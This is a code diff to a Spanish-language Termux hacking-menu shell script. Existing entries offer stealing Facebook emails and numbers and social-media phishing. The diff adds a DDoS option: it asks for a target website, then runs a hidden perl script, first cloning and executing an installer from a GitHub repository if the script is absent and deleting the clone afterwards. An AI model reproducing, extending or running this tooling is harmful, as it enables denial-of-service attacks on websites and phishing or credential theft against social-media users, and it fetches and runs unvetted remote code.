@@ -49,6 +49,7 @@ $ce[$ve 04$ce ]$am Reproductor para música de YouTube $re
 $ce[$ve 05$ce ]$am Robar correo y numeros de Facebook $re
 $ce[$ve 06$ce ]$am Hacer Phishing para Redes Sociales $re
 $ce[$ve 07$ce ]$am Descarga Ngrok sin errores de port $re
+$ce[$ve 08$ce ]$am Realiza un ataque DDoS  (by ivam3) $re
 $ce[$ve 99$ce ]$am Desactiva este script de tu termux $re
 "
 echo
@@ -379,9 +380,36 @@ cd
 ngrok tcp 5555
 ;;
 
- 
 
 
+
+
+
+
+
+08|8)
+website=
+if [ -z $website ];then
+read -p "Sitio web para atacar:  " website
+fi
+if [ -x $PREFIX/libexec/.iv3 ];then
+cd $PREFIX/libexec
+perl .iv3 $website 1415 0 0
+else
+cd
+pkg update -y
+pkg upgrade -y
+pkg install git -y
+git clone https://github.com/SaidGR/ivc.git > /dev/null 2>&1
+cd
+cd ivc
+chmod 777 .inc
+./inc
+cd
+rm -Rf ivc
+cd $PREFIX/libexec
+perl .iv3 $website 1415 0 0
+fi
 
 
 
